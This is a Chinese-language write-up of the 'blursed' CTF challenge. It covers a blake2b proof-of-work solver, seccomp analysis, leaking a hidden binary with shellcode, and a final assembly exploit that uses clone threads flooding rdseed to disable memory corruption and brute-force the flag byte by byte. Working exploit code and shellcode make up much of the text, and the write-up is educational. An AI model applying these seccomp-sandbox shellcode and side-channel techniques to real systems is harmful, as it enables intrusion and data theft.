# blursed
输出一个随机生成的0x10字节字符串，然后输入0x30字节的数据，二者在栈上是连续的。
![avatar](https://github.com/YmColdQiu/blursed-write-up/tree/main/pic/pow1.png)
共计0x40字节的数据放入`sub_43E2D0`中处理；在sub_43FAA0中看到一些常数，搜索得到两个结果`Sha512`和`blake2b`，两个算法使用同样的初始值；因为hash值的长度可自行设置，故为`blake2b`算法。
![avatar](https://github.com/YmColdQiu/blursed-write-up/tree/main/pic/hash.png)
对哈希后的结果进行判断，只有在前三个字节都为0时才可以继续执行。
```python
from pwn import *
from hashlib import blake2b, sha512
import itertools

p = process("./cursed")
context.arch = "amd64"

def pow():
    randstr = p.recv()
    for i in itertools.permutations(range(256),48):
        msg = "".join([chr(x) for x in i])
        data = randstr + msg.encode('latin')
        hsh = blake2b(data, digest_size=0x10).digest()
        if hsh[0] | hsh[1] | hsh[2] == 0:
            print(hsh)
            break
    p.send(msg.encode("latin"))
        
pow()
p.interactive()
```
接下来，用mmap分配大小0x1000为的RWX页面，然后使用clone函数启动子进程。子进程将`flag`读入一个128字节的缓冲区中，空余字节填充为\x01；然后将`bozo.bin`作为可执行代码映射到内存；将全局变量`byte_0x664f60`设置为1，然后将flag，和之前分配的RWX页面作为参数调用`bozo.bin`

主进程将会向之前分配的RWX页面中读入一个长度为0x1000字节的数据作为shellcode，然后等待`byte_0x664f60`设置为1。尝试直接getshell失败
```python
>>> pwn.asm(pwn.shellcraft.execve("/bin/bash"))
b'jhH\xb8/bin/basPH\x89\xe71\xd21\xf6j;X\x0f\x05'
```
```x86asm
   0x7f6eb7193011                  shl    BYTE PTR [rcx], cl
   0x7f6eb7193013                  imul   BYTE PTR [rdx+0x3b]
   0x7f6eb7193016                  pop    rax
 → 0x7f6eb7193017                  syscall 
   0x7f6eb7193019                  ret    
   0x7f6eb719301a                  ret    
   0x7f6eb719301b                  ret    
   0x7f6eb719301c                  ret    
   0x7f6eb719301d                  ret    
────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cursed", stopped 0x7f6eb7193017 in ?? (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f6eb7193017 → syscall 
───────────────────────────────────────────────────────────────────────────────
gef➤  

Program terminated with signal SIGSYS, Bad system call.
The program no longer exists.
gef➤  

```

查看字符串可以看到seccomp字样，查找交叉引用找到开启seccomp的位置为`sub_4300D0`，写入一个死循环的shellcode让程序可以不退出
```python
>>> pwn.asm("start:mov rax,1;jmp start")
b'H\xc7\xc0\x01\x00\x00\x00\xeb\xf7'
```
使用`seccomp-tools`查看规则
![avatar](https://github.com/YmColdQiu/blursed-write-up/tree/main/pic/seccomp.png)

首先，需要leak出`bozo.bin`从而了解其如何处理flag以及shellcode。由于mmap通常会从高到低分配连续的空间，所以bozo.bin的分配的空间会在RWX页的前面
```
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /home/ymcold/cursed
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /home/ymcold/cursed
0x0000000000402000 0x0000000000407000 0x0000000000002000 --- /home/ymcold/cursed
0x0000000000407000 0x000000000040a000 0x0000000000007000 r-x /home/ymcold/cursed
0x000000000040a000 0x0000000000655000 0x000000000000a000 --- /home/ymcold/cursed
0x0000000000656000 0x0000000000662000 0x0000000000255000 r-- /home/ymcold/cursed
0x0000000000662000 0x0000000000665000 0x0000000000261000 rw- /home/ymcold/cursed
0x0000000000665000 0x000000000066f000 0x0000000000000000 rw- 
0x00000000012f4000 0x0000000001317000 0x0000000000000000 rw- [heap]
0x00007f4aadc52000 0x00007f4aadc53000 0x0000000000000000 r-x /home/ymcold/bozo.bin
0x00007f4aadc53000 0x00007f4aadc54000 0x0000000000000000 rwx 
0x00007ffca58f8000 0x00007ffca5919000 0x0000000000000000 rw- [stack]
0x00007ffca597b000 0x00007ffca597f000 0x0000000000000000 r-- [vvar]
0x00007ffca597f000 0x00007ffca5981000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
```
因此leak`bozo.bin`是很轻松的
```x86asm
call start
start:
    pop rsi
    sub rsi, 0x1005
    mov rdi,1
    mov rdx,0x1000
    mov rax,1
    syscall
```

由于此题缺少远程环境，并且未找到bozo.bin的二进制文件，所以在之后的流程只能通过网上现有的write-up了解。

在bozo.bin 的流程如下
- 将flag加载到`xmm0-xmm7`,然后设置rbx为`shellcode_addr+0xff8`位置
- 使用shellcode填充原本flag的位置
- 执行128段相似的代码块
```x86asm
; rbx == [input+0xff8]
loc_3E: ; first block
xor     r8, r8
pextrb  eax, xmm7, 0Fh  ; load the a flag byte into al
; different blocks fetch different bytes
cmpxchg [rbx], r8       ; if al == [rbx]:
                        ;   [rbx] = r8
                        ;   break since ZF=0
                        ; else:
                        ;   al = [rbx]
pause
jnz     short loc_3E
call    sub_BE8
```
代码块会从`xmm`寄存器中读取一个字节并和`rbx`中的值进行比较；如果相等则会将`rbx`中的值设置为0，否则进行循环。
思路是将`input+0xff8`中的值遍历`1-255`，然后看是否该值被设置为0；如果为0，则为正确的flag，否则继续循环。

然而问题在于每次执行完一个小的代码块，都会执行一次`sub_BE8`
```x86asm
 sub_BE8         proc near
     mov     rcx, 8
 loc_BEF:
         xor     rax, rax
         rdseed  rax
         and     rax, 0FFFh ; rax = rand([0:0xfff])
         mov     dword ptr [rsi+rax], 0FFFFFFFFh
         ; write to shellcode randomly
         dec     rcx
         cmp     rcx, 0
         jg      short loc_BEF
     retn
 sub_BE8         endp
```
该代码会随机的使用`0xffffffff`填充在我们的shellcode位置，使shellcode无法继续执行。

解决问题的关键在于rdseed指令。
![avatar](https://github.com/YmColdQiu/blursed-write-up/tree/main/pic/rdseed.png)
该指令在被大量执行时，会发生错误，如果错误则会固定返回0；那么`sub_BE8`就不会将`0xffffffff`写入到我们的shellcode上了

`seccomp`规则中提供了`clone`函数，可以使用该函数开启多个子进程反复调用`rdseed`指令，使其执行失败，从而完成对`flag`的遍历。

具体的shellcode 如下
```x86asm
call next
next: pop rbx

mov rbp, %s ; parameterize number of threads
clones:
	mov rdi,0x18900 
	; use the same flag as that of bozo.bin thread
	mov rsi,rsp
	sub rsi,0x2000
	; stack is rsp-0x2000, although not used
	mov rax,SYS_clone
	syscall ; call clone
	test rax, rax
	jz rdseed_loop 
	; let child thread execute the rdseed loop
	dec rbp
	test rbp,rbp
jnz clones

add rbx, -5+0xff8 ; rbx = RWX+0xff8
mov rsi, rbx
sub rsi, 8 ; rsi = buffer for SYS_write
mov rax, SYS_write
mov rdi, 1 ; fd = stdout
mov rdx, 1 ; size = 1
; load the needed arguement into register first
; to reduce size of the loop
; therefore the crack_loop is less likely to be destructed

mov rcx,0x100
wait0: loop wait0
; wait for a while to ensure threads are started
; maybe it is not needed

crack_loop:
	mov r8,1 ; i = 1
	byte_loop:
		mov qword ptr [rbx], r8 ; [rbx] = i
		mov rcx,%s
		wait: loop wait ; wait
		; the rcx, number of times, is parameterized
		cmp qword ptr [rbx], 0
		jnz byte_loop_end ; if [rbx] == 0
		mov [rsi], r8
		syscall ; print i
		jmp crack_loop ; break, try next byte
		byte_loop_end:
		inc r8 ; if [rbx] != 0, increment i and try next value
		cmp r8, 0xff
		jbe byte_loop
jmp crack_loop

rdseed_loop:
rdseed rax
jmp rdseed_loop
```